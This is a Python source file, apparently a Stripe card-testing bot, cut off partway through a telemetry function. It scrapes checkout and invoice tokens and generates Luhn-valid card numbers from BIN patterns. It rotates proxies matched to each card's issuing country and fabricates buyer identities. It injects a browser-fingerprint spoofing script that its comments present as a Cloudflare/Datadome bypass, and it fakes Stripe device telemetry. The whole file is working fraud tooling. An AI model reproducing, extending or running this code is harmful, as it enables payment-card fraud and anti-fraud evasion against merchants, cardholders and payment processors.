import re
import json
import time
import random
import asyncio
import requests
import aiohttp
from datetime import datetime
from typing import Dict, List, Optional
from curl_cffi import requests as cffi_requests
from dotenv import load_dotenv
import math
import numpy as np
from scipy.interpolate import interp1d

load_dotenv()

# ============= CONFIGURATION =============
MAX_ATTEMPTS = 10
CONCURRENT_BATCH_SIZE = 10  # Worker pool size
BATCH_DELAY = 5

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

STRIPE_DECLINE_CODES = {
    "generic_decline": "Card declined by issuer",
    "incorrect_cvv": "CVV verification failed",
    "insufficient_funds": "Insufficient funds",
    "expired_card": "Card has expired",
    "incorrect_number": "Invalid card number",
    "invalid_cvc": "Invalid security code",
    "do_not_honor": "Transaction declined by bank",
    "fraudulent": "Fraud detection triggered",
    "lost_card": "Card reported lost",
    "stolen_card": "Card reported stolen",
    "processing_error": "Processor error",
    "authentication_required": "3DS required",
    "card_declined": "Card declined",
    "rate_limit": "Too many attempts - Slow down",
    "transaction_not_allowed": "Transaction not allowed"
}

# ============= STRIPE API EXTRACTOR =============

class StripeAPIExtractor:
    @staticmethod
    def extract_cs_live(url: str, html: str) -> Optional[str]:
        patterns = [r'/c/pay/(cs_[a-z]+_[a-zA-Z0-9]+)', r'/payment_pages/(cs_[a-z]+_[a-zA-Z0-9]+)', r'cs_[a-z]+_[a-zA-Z0-9]+']
        for pattern in patterns:
            match = re.search(pattern, url)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        match = re.search(r'cs_[a-z]+_[a-zA-Z0-9]+', html)
        return match.group(0) if match else None
    
    @staticmethod
    def extract_pk_live(html: str) -> Optional[str]:
        patterns = [r'pk_[a-z]+_[a-zA-Z0-9]+', r'"publishableKey":"(pk_[a-z]+_[a-zA-Z0-9]+)"', r'data-stripe-publishable-key="(pk_[a-z]+_[a-zA-Z0-9]+)"']
        for pattern in patterns:
            match = re.search(pattern, html)
            if match: return match.group(1) if '(' in pattern else match.group(0)
        return None
    
    @staticmethod
    async def fetch_payment_data(user_id: int, cs_live: str, pk_live: str) -> Dict:
        try:
            url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
            headers = {"authority": "api.stripe.com", "accept": "application/json", "content-type": "application/x-www-form-urlencoded", "user-agent": random.choice(USER_AGENTS)}
            data = {"key": pk_live, "eid": "NA", "browser_locale": "en-US", "browser_timezone": "America/New_York", "redirect_type": "url"}
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                proxies = {"http": proxy_url, "https": proxy_url}
                
            loop = asyncio.get_event_loop()
            response = await loop.run_in_executor(None, lambda: cffi_requests.post(url, headers=headers, data=data, proxies=proxies, timeout=5, impersonate="chrome120"))
            if response.status_code == 200:
                resp_json = response.json()
                amount = None
                merchant = "Unknown"
                
                # Prioritize invoice and total_summary for subscriptions and adaptive local currency pricing
                invoice = resp_json.get('invoice')
                if isinstance(invoice, dict):
                    if invoice.get('amount_due') is not None:
                        amount = invoice['amount_due']
                    elif invoice.get('total') is not None:
                        amount = invoice['total']
                
                if amount is None:
                    ts = resp_json.get('total_summary')
                    if isinstance(ts, dict):
                        if ts.get('due') is not None:
                            amount = ts['due']
                        elif ts.get('total') is not None:
                            amount = ts['total']
                            
                if amount is None:
                    lig = resp_json.get('line_item_group')
                    if lig and isinstance(lig, dict) and lig.get('total') is not None:
                        amount = lig['total']
                    elif resp_json.get('amount') is not None:
                        amount = resp_json['amount']
                    elif resp_json.get('payment_intent') and isinstance(resp_json.get('payment_intent'), dict) and resp_json['payment_intent'].get('amount') is not None:
                        amount = resp_json['payment_intent']['amount']
                    else:
                        def _find_amount(d):
                            if isinstance(d, dict):
                                for k in ['amount_total', 'amount_due']:
                                    if k in d and isinstance(d[k], int): return d[k]
                                for v in d.values():
                                    res = _find_amount(v)
                                    if res is not None: return res
                            elif isinstance(d, list):
                                for item in d:
                                    res = _find_amount(item)
                                    if res is not None: return res
                            return None
                        amount = _find_amount(resp_json)
                    
                acct = resp_json.get('account_settings')
                if acct and isinstance(acct, dict) and acct.get('display_name'):
                    merchant = acct['display_name']
                elif resp_json.get('statement_descriptor'):
                    merchant = resp_json['statement_descriptor']
                    
                currency = resp_json.get('currency', 'usd').upper()
                
                locked_email = None
                if resp_json.get('customer_email'): locked_email = resp_json['customer_email']
                elif resp_json.get('prefilled_email'): locked_email = resp_json['prefilled_email']
                elif isinstance(resp_json.get('customer'), dict) and resp_json['customer'].get('email'): locked_email = resp_json['customer']['email']
                elif isinstance(resp_json.get('customer_details'), dict) and resp_json['customer_details'].get('email'): locked_email = resp_json['customer_details']['email']
                
                return {'success': True, 'amount': f"{currency} {amount/100:.2f}" if amount is not None else None, 'raw_amount': amount, 'merchant': merchant, 'locked_email': locked_email}
            
            try:
                err_msg = response.json().get('error', {}).get('message', f'Status {response.status_code}')
            except:
                err_msg = f'Status {response.status_code}'
            return {'success': False, 'error': err_msg}
        except Exception as e:
            return {'success': False, 'error': f"Connection failed: {str(e)}"}

    @staticmethod
    async def fetch_invoice_data(user_id: int, url: str) -> Dict:
        try:
            import urllib.parse
            parsed = urllib.parse.urlparse(url)
            path_parts = [p for p in parsed.path.split('/') if p]
            if len(path_parts) < 3 or path_parts[0] != 'i':
                return {'success': False, 'error': 'Invalid invoice URL format'}
            
            merchant_token = path_parts[1]
            invoice_secret = path_parts[2]
            
            proxy_data = await ProxyManager.get_random(user_id)
            proxies = None
            if proxy_data:
                auth = f"{proxy_data['username']}:{proxy_data['password']}@" if proxy_data.get('username') else ""
                proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
                proxies = {"http": proxy_url, "https": proxy_url}
                
            invoicedata_url = f"https://invoicedata.stripe.com/hosted_invoice_page/{merchant_token}/{invoice_secret}"
            
            headers = {
                "accept": "application/json",
                "origin": "https://invoice.stripe.com",
                "referer": "https://invoice.stripe.com/",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            }
            
            loop = asyncio.get_event_loop()
            resp = await loop.run_in_executor(None, lambda: cffi_requests.get(invoicedata_url, headers=headers, proxies=proxies, timeout=10, impersonate="chrome120"))
            if resp.status_code != 200:
                return {'success': False, 'error': f'Failed invoicedata check: {resp.status_code}'}
                
            res_json = resp.json()
            pk_key = res_json.get('publishable_key')
            ek = res_json.get('ephemeral_key')
            invoice_id = res_json.get('invoice_id')
            
            if not pk_key or not ek or not invoice_id:
                return {'success': False, 'error': 'Missing elements in invoicedata response'}
                
            hosted_url = f"https://api.stripe.com/v1/invoices/{invoice_id}/hosted"
            hosted_headers = {
                "accept": "application/json",
                "authorization": f"Bearer {ek}",
                "stripe-version": "2020-03-02",
                "user-agent": headers["user-agent"]
            }
            
            hosted_resp = await loop.run_in_executor(None, lambda: cffi_requests.get(hosted_url, headers=hosted_headers, proxies=proxies, timeout=10, impersonate="chrome120"))
            if hosted_resp.status_code != 200:
                return {'success': False, 'error': f'Failed invoices/hosted check: {hosted_resp.status_code}'}
                
            hosted_json = hosted_resp.json()
            pi = hosted_json.get('payment_intent')
            pi_cs = None
            if isinstance(pi, dict):
                pi_cs = pi.get('client_secret')
                
            if not pi_cs:
                return {'success': False, 'error': 'No active payment intent found on invoice'}
                
            amount = hosted_json.get('amount_due') or hosted_json.get('total')
            currency = hosted_json.get('currency', 'usd').upper()
            merchant = "Unknown"
            acct = res_json.get('merchant')
            if acct and isinstance(acct, dict) and acct.get('business_name'):
                merchant = acct['business_name']
                
            locked_email = hosted_json.get('customer_email') or res_json.get('prefilled_email')
            
            return {
                'success': True,
                'cs_token': pi_cs,
                'pk_key': pk_key,
                'amount': f"{currency} {amount/100:.2f}" if amount is not None else None,
                'raw_amount': amount,
                'merchant': merchant,
                'locked_email': locked_email
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}


# ============= BASE AUTOFILL =============
class ProxyManager:
    db_pool = None

    @classmethod
    async def init_db(cls, db_pool):
        cls.db_pool = db_pool

    @classmethod
    async def get_user_proxies(cls, user_id: int) -> List[Dict]:
        if not cls.db_pool: return []
        async with cls.db_pool.acquire() as conn:
            row = await conn.fetchrow("SELECT proxies FROM user_proxies WHERE user_id = $1", user_id)
            if row and row['proxies']:
                return json.loads(row['proxies'])
            return []

    @classmethod
    async def get_all_users(cls) -> List[int]:
        if not cls.db_pool: return []
        async with cls.db_pool.acquire() as conn:
            rows = await conn.fetch("SELECT user_id FROM user_proxies")
            return [row['user_id'] for row in rows]


    @classmethod
    async def save_user_proxies(cls, user_id: int, proxies: List[Dict]):
        if not cls.db_pool: return
        async with cls.db_pool.acquire() as conn:
            await conn.execute("""
                INSERT INTO user_proxies (user_id, proxies)
                VALUES ($1, $2)
                ON CONFLICT (user_id) DO UPDATE SET proxies = EXCLUDED.proxies
            """, user_id, json.dumps(proxies))

    @classmethod
    async def load(cls, user_id: int, raw_text: str) -> int:
        pool = await cls.get_user_proxies(user_id)
            
        lines = [line.strip() for line in raw_text.split('\n') if line.strip()]
        added = 0
        for line in lines:
            prefix = "http://"
            raw_line = line
            if line.lower().startswith("socks5://"):
                prefix = "socks5://"
                line = line[9:]
            elif line.lower().startswith("http://"):
                prefix = "http://"
                line = line[7:]
                
            parts = line.split(':')
            if len(parts) == 4:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}", "username": parts[2], "password": parts[3]}
                pool.append(p)
                added += 1
            elif len(parts) == 2:
                p = {"raw": raw_line, "server": f"{prefix}{parts[0]}:{parts[1]}"}
                pool.append(p)
                added += 1
        if added > 0:
            await cls.save_user_proxies(user_id, pool)
        return added

    @classmethod
    async def get_random(cls, user_id: int) -> Optional[Dict]:
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None
        return random.choice(pool)
        
    @classmethod
    async def remove(cls, user_id: int, proxy_raw: str):
        pool = await cls.get_user_proxies(user_id)
        new_pool = [p for p in pool if p['raw'] != proxy_raw]
        if len(new_pool) != len(pool):
            await cls.save_user_proxies(user_id, new_pool)
        
    @classmethod
    async def clear(cls, user_id: int):
        await cls.save_user_proxies(user_id, [])

    @classmethod
    async def get_count(cls, user_id: int) -> int:
        pool = await cls.get_user_proxies(user_id)
        return len(pool)
        
    @classmethod
    async def has_proxies(cls, user_id: int) -> bool:
        return await cls.get_count(user_id) > 0

    _geo_cache: Dict[str, str] = {}

    @classmethod
    async def get_geo_matched(cls, user_id: int, target_country: str) -> Optional[Dict]:
        """Select a proxy matching the card's issuing country. Falls back to random."""
        if not target_country:
            return await cls.get_random(user_id)
        target = target_country.upper()
        pool = await cls.get_user_proxies(user_id)
        if not pool:
            return None
        matches = [p for p in pool if cls._geo_cache.get(p.get('server', ''), '').upper() == target]
        if matches:
            return random.choice(matches)
        uncached = [p for p in pool if p.get('server', '') not in cls._geo_cache]
        random.shuffle(uncached)
        for proxy in uncached[:3]:
            try:
                auth_str = f"{proxy['username']}:{proxy['password']}@" if proxy.get('username') else ""
                purl = f"http://{auth_str}{proxy['server'].replace('http://', '')}"
                async with aiohttp.ClientSession() as sess:
                    async with sess.get("http://ip-api.com/json/", proxy=purl, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            cc = (data.get('countryCode') or '').upper()
                            cls._geo_cache[proxy.get('server', '')] = cc
                            if cc == target:
                                return proxy
            except:
                pass
        return random.choice(pool)

    @classmethod
    def format_for_playwright(cls, proxy_data: Dict) -> Dict:
        playwright_proxy = {"server": proxy_data["server"]}
        if "username" in proxy_data:
            playwright_proxy["username"] = proxy_data["username"]
            playwright_proxy["password"] = proxy_data["password"]
        return playwright_proxy

# ============= RANDOM DATA =============
class RandomData:
    FIRST_NAMES = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
                   "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen"]
    LAST_NAMES = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez"]
    STREETS = ["Main St","Oak Ave","Maple Rd","Pine Ln","Cedar Dr","Elm St","Washington Blvd","Lake Shore Dr"]
    CITIES = ["New York","Los Angeles","Chicago","Houston","Phoenix","Philadelphia","San Antonio","San Diego"]
    STATES = ["CA","NY","TX","FL","IL","PA","OH","GA","NC","MI"]
    ZIP_CODES = ["10001","90210","60601","77001","85001","19101","78201","92101"]
    
    @staticmethod
    def get_name(): return f"{random.choice(RandomData.FIRST_NAMES)} {random.choice(RandomData.LAST_NAMES)}"
    @staticmethod
    def get_email(): return f"dlx{random.randint(1000,99999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    @staticmethod
    def get_phone(): return f"+1{random.randint(200,999)}{random.randint(200,999)}{random.randint(1000,9999)}"
    _geo_cache = {}

    @staticmethod
    async def get_address_and_timezone(proxy_url: Optional[str] = None):
        if proxy_url and proxy_url in RandomData._geo_cache:
            return RandomData._geo_cache[proxy_url]

        timezone_id = 'America/New_York'
        address = {"line1": f"{random.randint(100,9999)} {random.choice(RandomData.STREETS)}",
                "city": random.choice(RandomData.CITIES),
                "state": random.choice(RandomData.STATES),
                "zip": random.choice(RandomData.ZIP_CODES),
                "country": "US"}
                
        # Map country to locale
        locales = {
            "US": "en-US", "GB": "en-GB", "CA": "en-CA", "AU": "en-AU", 
            "FR": "fr-FR", "DE": "de-DE", "ES": "es-ES", "IT": "it-IT",
            "JP": "ja-JP", "BR": "pt-BR", "MX": "es-MX", "IN": "en-IN",
            "NL": "nl-NL", "RU": "ru-RU", "KR": "ko-KR", "CN": "zh-CN",
            "SE": "sv-SE", "TR": "tr-TR", "ZA": "en-ZA", "SG": "en-SG"
        }
        
        if proxy_url:
            try:
                # Use a fast, free geolocation API through the proxy to find its exact physical timezone
                async with aiohttp.ClientSession() as session:
                    async with session.get("http://ip-api.com/json/", proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            if data.get("timezone"):
                                timezone_id = data["timezone"]
                            new_country = data.get("countryCode")
                            if new_country:
                                fallback_addresses = {
                                    "US": {"zip": random.choice(RandomData.ZIP_CODES), "city": "New York", "state": "NY"},
                                    "GB": {"zip": "SW1A 1AA", "city": "London", "state": "London"},
                                    "CA": {"zip": "M5V 2L7", "city": "Toronto", "state": "ON"},
                                    "AU": {"zip": "2000", "city": "Sydney", "state": "NSW"},
                                    "FR": {"zip": "75001", "city": "Paris", "state": "Paris"},
                                    "DE": {"zip": "10115", "city": "Berlin", "state": "Berlin"},
                                    "IT": {"zip": "00118", "city": "Roma", "state": "RM"},
                                    "ES": {"zip": "28001", "city": "Madrid", "state": "Madrid"},
                                    "BR": {"zip": "01000-000", "city": "Sao Paulo", "state": "SP"},
                                    "MX": {"zip": "06000", "city": "Ciudad de Mexico", "state": "DF"},
                                    "IN": {"zip": "110001", "city": "New Delhi", "state": "Delhi"},
                                    "JP": {"zip": "100-0001", "city": "Chiyoda-ku", "state": "Tokyo"},
                                    "SG": {"zip": "018956", "city": "Singapore", "state": "Singapore"},
                                    "AE": {"zip": "00000", "city": "Dubai", "state": "Dubai"},
                                    "CH": {"zip": "1000", "city": "Lausanne", "state": "VD"},
                                    "NL": {"zip": "1011 AB", "city": "Amsterdam", "state": "North Holland"},
                                    "SE": {"zip": "111 22", "city": "Stockholm", "state": "Stockholm"},
                                    "NO": {"zip": "0150", "city": "Oslo", "state": "Oslo"},
                                    "DK": {"zip": "1000", "city": "Kobenhavn", "state": "Kobenhavn"},
                                    "FI": {"zip": "00100", "city": "Helsinki", "state": "Uusimaa"},
                                    "AT": {"zip": "1010", "city": "Wien", "state": "Wien"},
                                    "BE": {"zip": "1000", "city": "Bruxelles", "state": "Bruxelles"},
                                    "PT": {"zip": "1000-001", "city": "Lisboa", "state": "Lisboa"},
                                    "NZ": {"zip": "1010", "city": "Auckland", "state": "Auckland"},
                                    "TW": {"zip": "100", "city": "Taipei", "state": "Taipei"},
                                    "HK": {"zip": "000000", "city": "Hong Kong", "state": "Hong Kong"},
                                    "MY": {"zip": "50000", "city": "Kuala Lumpur", "state": "Kuala Lumpur"},
                                    "TH": {"zip": "10100", "city": "Bangkok", "state": "Bangkok"},
                                    "VN": {"zip": "70000", "city": "Ho Chi Minh City", "state": "Ho Chi Minh City"},
                                    "PH": {"zip": "1000", "city": "Manila", "state": "Metro Manila"},
                                    "ID": {"zip": "10110", "city": "Jakarta", "state": "DKI Jakarta"},
                                    "KR": {"zip": "01000", "city": "Seoul", "state": "Seoul"}
                                }
                                
                                if new_country in fallback_addresses:
                                    addr_data = fallback_addresses[new_country]
                                    address["country"] = new_country
                                    address["zip"] = addr_data["zip"]
                                    address["city"] = addr_data["city"]
                                    address["state"] = addr_data["state"]
            except: pass
            
        locale = locales.get(address["country"], "en-US")
        result_tuple = (address, timezone_id, locale)
        if proxy_url:
            RandomData._geo_cache[proxy_url] = result_tuple
            
        return result_tuple

# ============= BIN LOOKUP =============
class BINLookup:
    """Free BIN database lookup with in-memory caching"""
    _cache: Dict[str, Dict] = {}

    @classmethod
    async def lookup(cls, card_number: str) -> Dict:
        bin6 = card_number[:6]
        if bin6 in cls._cache:
            return cls._cache[bin6]
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(f"https://bins.antipublic.cc/bins/{bin6}", timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        result = {
                            'country': (data.get('countrycode') or '').upper(),
                            'country_name': data.get('country', ''),
                            'bank': data.get('bank', ''),
                            'brand': data.get('brand', ''),
                            'type': data.get('type', ''),
                            'level': data.get('level', '')
                        }
                        cls._cache[bin6] = result
                        return result
        except Exception:
            pass
        fallback = {'country': '', 'country_name': '', 'bank': '', 'brand': '', 'type': '', 'level': ''}
        cls._cache[bin6] = fallback
        return fallback

# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def luhn(card: str) -> int:
        def digits_of(n): return [int(d) for d in str(n)]
        digits = digits_of(card)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d*2))
        return checksum % 10
    
    @staticmethod
    def generate(bin_pattern: str) -> Optional[Dict]:
        if not bin_pattern: return None
        parts = bin_pattern.split('|')
        bin_clean = re.sub(r'[^0-9xX]','',parts[0])
        is_amex = bin_clean.startswith(('34','37'))
        target_len = 15 if is_amex else 16
        cvv_len = 4 if is_amex else 3
        card = ''
        for c in bin_clean:
            card += str(random.randint(0,9)) if c.lower()=='x' else c
        remaining = target_len - len(card) - 1
        for _ in range(remaining): card += str(random.randint(0,9))
        for i in range(10):
            if CardGenerator.luhn(card+str(i))==0:
                full_card = card+str(i)
                break
        else: full_card = card+'0'
        if len(full_card) != target_len: full_card = full_card.ljust(target_len,'0')
        month = parts[1].zfill(2) if len(parts)>1 and parts[1].lower()!='xx' else f"{random.randint(1,12):02d}"
        year = parts[2].zfill(2) if len(parts)>2 and parts[2].lower()!='xx' else f"{datetime.now().year+random.randint(1,5):02d}"
        cvv = parts[3] if len(parts)>3 and parts[3].lower() not in ('xxx','xxxx') else ''.join(str(random.randint(0,9)) for _ in range(cvv_len))
        return {'card':full_card, 'month':month, 'year':year, 'cvv':cvv}



# ============= AUTOFILL ENGINES =============
HARDWARE_SPOOF_SCRIPT = """
    Object.defineProperty(navigator,'webdriver',{get:()=>undefined});
    window.chrome={runtime:{}};
    
    // Emulate Modern Flagship Mobile Hardware Capabilities
    Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 }); // Octa-core CPU
    Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 }); // 8GB RAM
    Object.defineProperty(navigator, 'maxTouchPoints', { get: () => 5 }); // 5-finger multi-touch
    
    // Emulate Battery
    navigator.getBattery = async () => ({
        charging: false,
        chargingTime: Infinity,
        dischargingTime: 8400,
        level: 0.85 + (Math.random() * 0.1),
        addEventListener: () => {}
    });
    
    // Emulate Gyroscope/Accelerometer permission
    navigator.permissions.query = new Proxy(navigator.permissions.query, {
        apply: async (target, thisArg, args) => {
            if (args[0].name === 'accelerometer' || args[0].name === 'gyroscope') {
                return { state: 'granted', onchange: null };
            }
            return Reflect.apply(target, thisArg, args);
        }
    });
    
    // Simulating natural device vibration API
    navigator.vibrate = (pattern) => true;
    
    // Spoofing Gyroscope movement (simulates a human holding a phone)
    setInterval(() => {
        try {
            const motionEvent = new Event('devicemotion');
            motionEvent.acceleration = { x: Math.random() * 0.01, y: Math.random() * 0.01, z: 9.81 + (Math.random() * 0.01) };
            motionEvent.rotationRate = { alpha: Math.random() * 0.1, beta: Math.random() * 0.1, gamma: Math.random() * 0.1 };
            window.dispatchEvent(motionEvent);
        } catch(e) {}
    }, 50);
    
    // Exact Viewport/Screen Synchronization
    Object.defineProperty(window.screen, 'colorDepth', { get: () => 32 });
    Object.defineProperty(window.screen, 'pixelDepth', { get: () => 32 });
    Object.defineProperty(window.screen, 'width', { get: () => 390 });
    Object.defineProperty(window.screen, 'height', { get: () => 844 });
    Object.defineProperty(window.screen, 'availWidth', { get: () => 390 });
    Object.defineProperty(window.screen, 'availHeight', { get: () => 844 });
    Object.defineProperty(window, 'outerWidth', { get: () => 390 });
    Object.defineProperty(window, 'outerHeight', { get: () => 844 });
    
    // Block WebRTC IP Leaks (Silent Bypass)
    Object.defineProperty(navigator, 'mediaDevices', { value: undefined, configurable: false, writable: false });
    const FakeRTC = function() {
        this.createDataChannel = () => ({});
        this.createOffer = () => Promise.resolve({ sdp: '', type: 'offer' });
        this.setLocalDescription = () => Promise.resolve();
        this.close = () => {};
        this.addEventListener = () => {};
        this.localDescription = { sdp: '' };
        this.iceConnectionState = 'new';
    };
    window.RTCPeerConnection = FakeRTC;
    window.webkitRTCPeerConnection = FakeRTC;
    
    // Canvas Fingerprint Poisoning (Cloudflare/Datadome bypass)
    const originalGetContext = HTMLCanvasElement.prototype.getContext;
    HTMLCanvasElement.prototype.getContext = function(type, ...args) {
        const context = originalGetContext.apply(this, [type, ...args]);
        if (type === '2d') {
            const originalFillText = context.fillText;
            context.fillText = function(...args) {
                args[1] += (Math.random() - 0.5) * 0.02; // Subpixel noise
                return originalFillText.apply(this, args);
            };
            const originalGetImageData = context.getImageData;
            context.getImageData = function(...args) {
                const imageData = originalGetImageData.apply(this, args);
                // Math noise on 5 random pixels completely mutates SHA-256 fingerprint hash
                for(let i=0; i<5; i++) {
                    const idx = Math.floor(Math.random() * (imageData.data.length / 4)) * 4;
                    imageData.data[idx] = (imageData.data[idx] + 1) % 255;
                }
                return imageData;
            };
            
            // Font Metric Poisoning (measureText)
            // Bots measure text width to the thousandth decimal to fingerprint OS font smoothing engines.
            // We inject 0.0001% variance to spoof a unique subpixel rendering engine.
            const originalMeasureText = context.measureText;
            context.measureText = function(...args) {
                const metrics = originalMeasureText.apply(this, args);
                if (metrics && metrics.width) {
                    Object.defineProperty(metrics, 'width', {
                        value: metrics.width + (Math.random() - 0.5) * 0.001,
                        configurable: true
                    });
                }
                return metrics;
            };
        }
        return context;
    };
    
    // DOM ClientRect GPU Fractional Anti-Aliasing Spoofing
    // Headless browsers return perfectly round integers (e.g. 50.000) for element positions.
    // Real GPUs render with fractional anti-aliasing (e.g. 50.012). We inject this variance.
    const originalGetBoundingClientRect = Element.prototype.getBoundingClientRect;
    Element.prototype.getBoundingClientRect = function() {
        const rect = originalGetBoundingClientRect.apply(this);
        if(!rect) return rect;
        const randomize = (val) => val + (Math.random() - 0.5) * 0.005;
        return {
            x: randomize(rect.x),
            y: randomize(rect.y),
            width: randomize(rect.width),
            height: randomize(rect.height),
            top: randomize(rect.top),
            right: randomize(rect.right),
            bottom: randomize(rect.bottom),
            left: randomize(rect.left)
        };
    };
    
    // WebGL GPU Vendor & Renderer Spoofing
    const getParameterProxy = function (original) {
        return function (parameter) {
            // UNMASKED_VENDOR_WEBGL = 37445
            if (parameter === 37445) {
                return 'Qualcomm'; // Mobile GPU Vendor
            }
            // UNMASKED_RENDERER_WEBGL = 37446
            if (parameter === 37446) {
                return 'Adreno (TM) 740'; // Samsung Galaxy S23 Ultra GPU
            }
            return original.apply(this, [parameter]);
        };
    };
    const webgl1 = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = getParameterProxy(webgl1);
    const webgl2 = WebGL2RenderingContext.prototype.getParameter;
    WebGL2RenderingContext.prototype.getParameter = getParameterProxy(webgl2);
    
    // Audio Fingerprint Poisoning (Datadome hardware unmasking bypass)
    const audioMethods = ['createOscillator', 'createDynamicsCompressor', 'createBiquadFilter'];
    const fakeAudioContext = function(TargetContext) {
        if (!TargetContext) return;
        audioMethods.forEach(method => {
            if (TargetContext.prototype[method]) {
                const originalMethod = TargetContext.prototype[method];
                TargetContext.prototype[method] = function(...args) {
                    const node = originalMethod.apply(this, args);
                    if (method === 'createOscillator') {
                        node.type = 'triangle'; // Poison the wave shape
                        const originalStart = node.start;
                        node.start = function(...sArgs) {
                            // Introduce random frequency variance (+/- 0.05 Hz) to mutate audio SHA hash
                            if(this.frequency) {
                                this.frequency.value += (Math.random() - 0.5) * 0.1;
                            }
                            return originalStart.apply(this, sArgs);
                        };
                    }
                    return node;
                };
            }
        });
    };
    fakeAudioContext(window.OfflineAudioContext);
    fakeAudioContext(window.AudioContext);
    fakeAudioContext(window.webkitOfflineAudioContext);
    fakeAudioContext(window.webkitAudioContext);
"""

def find_receipt_url(d):
    if isinstance(d, dict):
        if 'receipt_url' in d and isinstance(d['receipt_url'], str) and d['receipt_url'].startswith('http'):
            return d['receipt_url']
        for v in d.values():
            res = find_receipt_url(v)
            if res:
                return res
    elif isinstance(d, list):
        for item in d:
            res = find_receipt_url(item)
            if res:
                return res
    return None

def extract_intent_details(d):
    intent_id = None
    client_secret = None
    
    if isinstance(d, dict):
        for key in ['payment_intent', 'setup_intent']:
            val = d.get(key)
            if isinstance(val, dict):
                intent_id = val.get('id')
                client_secret = val.get('client_secret')
                if intent_id and client_secret:
                    return intent_id, client_secret
            elif isinstance(val, str) and (val.startswith('pi_') or val.startswith('seti_')):
                intent_id = val
        
        intent_id = d.get('id') or intent_id
        client_secret = d.get('client_secret') or client_secret
        if intent_id and client_secret:
            return intent_id, client_secret
            
        for v in d.values():
            if isinstance(v, (dict, list)):
                i_id, c_sec = extract_intent_details(v)
                if i_id and c_sec:
                    return i_id, c_sec
                    
    elif isinstance(d, list):
        for item in d:
            i_id, c_sec = extract_intent_details(item)
            if i_id and c_sec:
                return i_id, c_sec
                
    return intent_id, client_secret

class StripeAPIHitter:
    _live_js_hash_cache = None

    @staticmethod
    def _fetch_live_stripe_js_hash():
        """Scrape the real Stripe.js build hash from the live CDN script once per session."""
        if StripeAPIHitter._live_js_hash_cache:
            return StripeAPIHitter._live_js_hash_cache
        try:
            import re as _re_hash
            resp = cffi_requests.get("https://js.stripe.com/v3/", timeout=8, impersonate="chrome124")
            if resp.status_code == 200:
                text = resp.text[:5000]  # hash is in the header chunk
                # Stripe.js exposes build hash in: e.p="https://js.stripe.com/v3/" or chunkId patterns
                # Look for fingerprinted asset paths like: fingerprinted/js/<name>-<hash>.js
                match = _re_hash.search(r'fingerprinted/js/[\w-]+-([a-f0-9]{10,40})\.js', text)
                if match:
                    StripeAPIHitter._live_js_hash_cache = match.group(1)[:10]
                    return StripeAPIHitter._live_js_hash_cache
        except Exception:
            pass
        # Fallback: use a recent known-good hash if scrape fails
        StripeAPIHitter._live_js_hash_cache = "da394b0aef"
        return StripeAPIHitter._live_js_hash_cache

    def __init__(self, pk_live: str, cs_live: str, proxy_data: Dict, raw_amount: int = None, locked_email: str = None):
        self.pk_live = pk_live
        self.cs_live = cs_live
        self.proxy_data = proxy_data
        self.raw_amount = raw_amount
        self.locked_email = locked_email

    async def generate_stripe_telemetry(self, profile: dict, proxies: dict, address: dict, page_url: str = None, session=None) -> Dict[str, str]:
        """Generate Stripe device fingerprint tokens via m.stripe.com/6"""
        import uuid as _uuid
        fallback = {'muid': str(_uuid.uuid4()), 'sid': str(_uuid.uuid4()), 'guid': str(_uuid.uuid4())}
        try:
            tz_map = {'US': -300, 'CA': -300, 'GB': 0, 'AU': -600, 'FR': -60, 'DE': -60, 'JP': -540, 'IN': -330, 'BR': 180, 'SG': -480, 'KR': -540, 'IT': -60, 'ES': -60, 'NL': -60, 'SE': -60, 'MX': 360}
            country = (address or {}).get('country', 'US')
            # Extract standard 2-letter ISO country code if present
            if len(country) > 2:
                # address structure sometimes maps full country name, look for 2-letter fallback
                country = 'US'
            tz_offset = tz_map.get(country, -300)
            
            # Map dynamic locales based on proxy country location for better accuracy
            locale_map = {'US': 'en-US', 'IN': 'en-IN', 'GB': 'en-GB', 'DE': 'de-DE', 'FR': 'fr-FR', 'BR': 'pt-BR'}
            locale = locale_map.get(country, 'en-US')

            is_pi = isinstance(self.cs_live, str) and self.cs_live.startswith('pi_')
            is_seti = isinstance(self.cs_live, str) and self.cs_live.startswith('seti_')
            # Use the real session page URL if provided, else build a best-guess
            if page_url:
                landing_url = page_url
            elif is_pi or is_seti:
                landing_url = f"https://invoice.stripe.com/i/{self.cs_live}"
            else:
                landing_url = f"https://checkout.stripe.com/c/pay/{self.cs_live}"

            # Dynamically set src tag based on session type — checkout vs merchant-embedded
